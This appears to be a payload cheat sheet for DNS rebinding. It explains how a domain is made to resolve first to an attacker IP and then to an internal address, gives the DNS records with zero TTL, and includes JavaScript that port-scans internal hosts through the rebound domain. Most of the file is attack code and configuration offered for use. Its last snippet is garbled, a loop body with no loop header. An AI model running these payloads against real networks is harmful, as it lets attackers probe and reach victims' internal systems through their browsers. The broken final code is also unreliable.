# DNS Rebinding Payloads

## ========================================
## BASIC DNS REBINDING
## ========================================

# Concept: Domain resolves to attacker IP first, then victim IP
# 1. victim visits attacker.com (resolves to attacker IP)
# 2. Browser caches, loads malicious JavaScript
# 3. DNS changes to resolve to internal IP (192.168.1.1)
# 4. JavaScript makes requests to "attacker.com" (now internal IP)

## ========================================
## DNS REBINDING SETUP
## ========================================

# DNS server configuration
# Initial query: attacker.com -> 203.0.113.10 (attacker)
# TTL: 0 seconds
# Second query: attacker.com -> 192.168.1.1 (victim)

# Example DNS responses
attacker.com. 0 IN A 203.0.113.10   # First
attacker.com. 0 IN A 192.168.1.1    # Second (rebind)

async function scanPort(ip, port) {
  const start = Date.now();
  try {
    await fetch(`http://${ip}:${port}`, {
      mode: 'no-cors'
    });
    const time = Date.now() - start;
    // Analyze timing
    if (time < 1000) {
      console.log(`Port ${port} open on ${ip}`);
    }
  } catch(e) {}
}

// After DNS rebind to internal IP

  scanPort('attacker.com', port);
}
